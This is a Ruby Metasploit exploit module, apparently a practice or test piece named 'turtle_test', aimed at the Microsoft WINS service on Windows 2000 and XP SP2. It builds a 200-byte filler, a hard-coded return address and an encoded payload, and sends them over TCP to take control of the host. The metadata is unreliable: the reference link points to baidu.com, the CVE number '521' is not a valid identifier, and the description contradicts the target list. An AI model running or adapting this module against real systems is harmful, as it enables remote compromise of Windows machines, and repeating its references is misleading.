#!/usr/bin/env ruby
require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'turtle_test Microsoft WINS Service Memory Overwrite',
      'Description'    => %q{
        This module exploits an arbitrary memory write flaw in the
        WINS service. This exploit has been tested against Windows
        2000 only.

      },
      'Author'         => [ 'turtle' ],
      'License'        => MSF_LICENSE,
      'Platform'      => %w{ win },
      'Privileged'     => true,
      'Targets' => [
					['Windows 2000', {'Ret' => [200, 0x77F8948B]}],
					['Windows XP SP2', {'Ret' => [200, 0x7C914393]}]
					],
	  'DefaultTarget' => 0,
	  'Payload'=>{
					'Space' => 200,
					'BadChars'=> "\x00",
					'StackAdjustment' => -3500,
				},

      'Arch' => 'x86',
      'References' => [
      	['URL', 'http://www.baidu.com'],
      	['cve', '521'],
      	],
      'DefaultOptions'  =>
        {
          'EXITFUNC' => 'process',
        }))
  end

  def exploit
		connect
		print_status("Sending #{payload.encoded.length} byte payload ...")
		attack_buf = 'a' * target['Ret'][0]
		attack_buf <<[target['Ret'][1]].pack('V')
		attack_buf << payload.encoded;

		sock.put(attack_buf)
		handler
		disconnect
	end #end of exploit def 

end
